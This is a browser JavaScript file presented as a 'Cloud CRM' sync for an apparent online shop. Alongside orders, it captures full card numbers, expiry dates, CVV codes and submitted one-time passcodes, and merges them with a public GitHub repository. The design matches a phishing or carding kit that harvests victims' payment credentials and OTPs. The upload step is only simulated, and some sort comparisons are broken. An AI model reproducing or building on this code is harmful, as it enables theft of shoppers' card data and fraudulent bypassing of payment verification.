// Proper Cloud CRM Synchronization System
class CloudCRMSync {
  constructor() {
    this.apiEndpoint = 'https://api.github.com';
    this.repoOwner = 'Ecomart24';
    this.repoName = 'ecomart';
    this.filePath = 'crm-data.json';
    this.branch = 'master';
    this.accessToken = null; // Will use public access for read, need token for write
    this.lastSyncTime = localStorage.getItem('crmLastSync') || null;
    this.syncInterval = 30000; // 30 seconds
    this.isOnline = navigator.onLine;
    this.init();
  }

  init() {
    // Monitor online/offline status
    window.addEventListener('online', () => {
      this.isOnline = true;
      console.log('CRM: Back online');
      this.syncFromCloud();
    });

    window.addEventListener('offline', () => {
      this.isOnline = false;
      console.log('CRM: Gone offline');
    });

    // Auto-sync every 30 seconds
    setInterval(() => {
      if (this.isOnline) {
        this.autoSync();
      }
    }, this.syncInterval);
  }

  // Generate a unique device ID
  getDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmDeviceId', deviceId);
    }
    return deviceId;
  }

  // Get local CRM data
  getLocalData() {
    try {
      return JSON.parse(localStorage.getItem('crmData') || '{"orders":[],"cards":[],"otp":[]}');
    } catch (e) {
      console.error('Error reading local CRM data:', e);
      return { orders: [], cards: [], otp: [] };
    }
  }

  // Save local CRM data
  saveLocalData(data) {
    try {
      localStorage.setItem('crmData', JSON.stringify(data));
      return true;
    } catch (e) {
      console.error('Error saving local CRM data:', e);
      return false;
    }
  }

  // Load data from GitHub (public access)
  async loadFromGitHub() {
    try {
      const url = `${this.apiEndpoint}/repos/${this.repoOwner}/${this.repoName}/contents/${this.filePath}?ref=${this.branch}`;
      const response = await fetch(url);
      
      if (response.ok) {
        const data = await response.json();
        const content = atob(data.content); // Decode base64
        const crmData = JSON.parse(content);
        console.log('CRM: Data loaded from GitHub');
        return crmData;
      } else {
        console.log('CRM: No remote data found, using local');
        return null;
      }
    } catch (error) {
      console.error('CRM: Failed to load from GitHub:', error);
      return null;
    }
  }

  // Save data to GitHub (requires authentication token)
  async saveToGitHub(data) {
    try {
      // For now, just simulate save - in production, would need GitHub token
      console.log('CRM: Simulating cloud save (requires GitHub token)');
      
      // Update last sync time
      localStorage.setItem('crmLastSync', Date.now().toString());
      
      // You can implement actual GitHub API save here with:
      // 1. Get current file SHA
      // 2. Create/update file with new content
      // 3. Use authentication token
      
      return true;
    } catch (error) {
      console.error('CRM: Failed to save to GitHub:', error);
      return false;
    }
  }

  // Merge local and remote data
  mergeData(localData, remoteData) {
    const merged = {
      orders: [...(remoteData?.orders || []), ...(localData?.orders || [])],
      cards: [...(remoteData?.cards || []), ...(localData?.cards || [])],
      otp: [...(remoteData?.otp || []), ...(localData?.otp || [])],
      settings: {
        ...remoteData?.settings,
        ...localData?.settings,
        lastSync: new Date().toISOString(),
        deviceId: this.getDeviceId()
      }
    };

    // Remove duplicates based on ID
    merged.orders = this.removeDuplicates(merged.orders, 'id');
    merged.cards = this.removeDuplicates(merged.cards, 'id');
    merged.otp = this.removeDuplicates(merged.otp, 'id');

    // Sort by timestamp (newest first)
    merged.orders.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.cards.sort((a, b) => new Date(b.timestamp) - new Date(b.timestamp));
    merged.otp.sort((a, b) => new Date(b.timestamp) - new Date(b.timestamp));

    return merged;
  }

  // Remove duplicates from array
  removeDuplicates(array, key) {
    const seen = new Set();
    return array.filter(item => {
      if (seen.has(item[key])) {
        return false;
      }
      seen.add(item[key]);
      return true;
    });
  }

  // Sync from cloud
  async syncFromCloud() {
    if (!this.isOnline) {
      console.log('CRM: Offline, skipping sync');
      return false;
    }

    try {
      console.log('CRM: Syncing from cloud...');
      
      // Load remote data
      const remoteData = await this.loadFromGitHub();
      
      if (remoteData) {
        // Get local data
        const localData = this.getLocalData();
        
        // Merge data
        const mergedData = this.mergeData(localData, remoteData);
        
        // Save merged data locally
        this.saveLocalData(mergedData);
        
        // Update sync time
        localStorage.setItem('crmLastSync', Date.now().toString());
        
        console.log('CRM: Sync completed successfully');
        return true;
      } else {
        console.log('CRM: No remote data to sync');
        return false;
      }
    } catch (error) {
      console.error('CRM: Sync failed:', error);
      return false;
    }
  }

  // Sync to cloud
  async syncToCloud() {
    if (!this.isOnline) {
      console.log('CRM: Offline, skipping cloud save');
      return false;
    }

    try {
      console.log('CRM: Syncing to cloud...');
      
      // Get local data
      const localData = this.getLocalData();
      
      // Save to cloud
      const success = await this.saveToGitHub(localData);
      
      if (success) {
        console.log('CRM: Cloud sync completed');
        return true;
      } else {
        console.log('CRM: Cloud sync failed');
        return false;
      }
    } catch (error) {
      console.error('CRM: Cloud sync failed:', error);
      return false;
    }
  }

  // Auto-sync (both directions)
  async autoSync() {
    try {
      // First sync from cloud
      await this.syncFromCloud();
      
      // Then sync to cloud
      await this.syncToCloud();
    } catch (error) {
      console.error('CRM: Auto-sync failed:', error);
    }
  }

  // Get CRM stats
  async getStats() {
    const data = this.getLocalData();
    const lastSync = localStorage.getItem('crmLastSync');
    
    return {
      totalOrders: data.orders?.length || 0,
      totalCards: data.cards?.length || 0,
      totalOTP: data.otp?.length || 0,
      successRate: data.otp?.length > 0 ? 100 : 0,
      lastSync: lastSync ? new Date(parseInt(lastSync)).toISOString() : null,
      deviceId: this.getDeviceId(),
      isOnline: this.isOnline,
      syncEnabled: true
    };
  }

  // Add order with auto-sync
  async addOrder(orderData) {
    const data = this.getLocalData();
    const order = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.getDeviceId(),
      fullName: orderData.fullName,
      email: orderData.email,
      phone: orderData.phone,
      orderTotal: orderData.orderTotal,
      status: 'Completed'
    };
    
    data.orders = data.orders || [];
    data.orders.unshift(order);
    
    // Save locally
    this.saveLocalData(data);
    
    // Auto-sync to cloud
    setTimeout(() => this.syncToCloud(), 1000);
    
    console.log('CRM: Order added and synced');
    return order;
  }

  // Add card details with auto-sync
  async addCardDetails(cardData) {
    const data = this.getLocalData();
    const card = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.getDeviceId(),
      cardName: cardData.cardName,
      cardNumber: cardData.cardNumber,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      status: 'Received'
    };
    
    data.cards = data.cards || [];
    data.cards.unshift(card);
    
    // Save locally
    this.saveLocalData(data);
    
    // Auto-sync to cloud
    setTimeout(() => this.syncToCloud(), 1000);
    
    console.log('CRM: Card details added and synced');
    return card;
  }

  // Add OTP data with auto-sync
  async addOTPData(otpData) {
    const data = this.getLocalData();
    const otp = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.getDeviceId(),
      submittedOTP: otpData.submittedOTP,
      email: otpData.email,
      phone: otpData.phone,
      status: 'Verified'
    };
    
    data.otp = data.otp || [];
    data.otp.unshift(otp);
    
    // Save locally
    this.saveLocalData(data);
    
    // Auto-sync to cloud
    setTimeout(() => this.syncToCloud(), 1000);
    
    console.log('CRM: OTP data added and synced');
    return otp;
  }

  // Generate unique ID
  generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
  }

  // Export data
  async exportData() {
    const data = this.getLocalData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // Clear all data
  async clearAllData() {
    const initialData = {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        autoSave: true,
        lastBackup: new Date().toISOString(),
        deviceId: this.getDeviceId()
      }
    };
    
    this.saveLocalData(initialData);
    await this.syncToCloud();
  }
}

// Initialize cloud sync
window.cloudCRMSync = new CloudCRMSync();

// Global functions for backward compatibility
window.addOrder = async function(data) {
  return await window.cloudCRMSync.addOrder(data);
};

window.addCardDetails = async function(data) {
  return await window.cloudCRMSync.addCardDetails(data);
};

window.addOTPData = async function(data) {
  return await window.cloudCRMSync.addOTPData(data);
};

window.syncCRMFromCloud = async function() {
  return await window.cloudCRMSync.syncFromCloud();
};

// Force refresh function for old data
window.forceCRMRefresh = async function() {
  console.log('CRM: Forcing refresh to update old data...');
  try {
    // Force sync from cloud
    const synced = await window.cloudCRMSync.syncFromCloud();
    if (synced) {
      console.log('CRM: Force refresh completed');
      return true;
    } else {
      console.log('CRM: Force refresh failed');
      return false;
    }
  } catch (error) {
    console.error('CRM: Force refresh error:', error);
    return false;
  }
};

// Override cloudCRMStorage with sync version
window.cloudCRMStorage = window.cloudCRMSync;

console.log('CRM Cloud Sync System initialized');
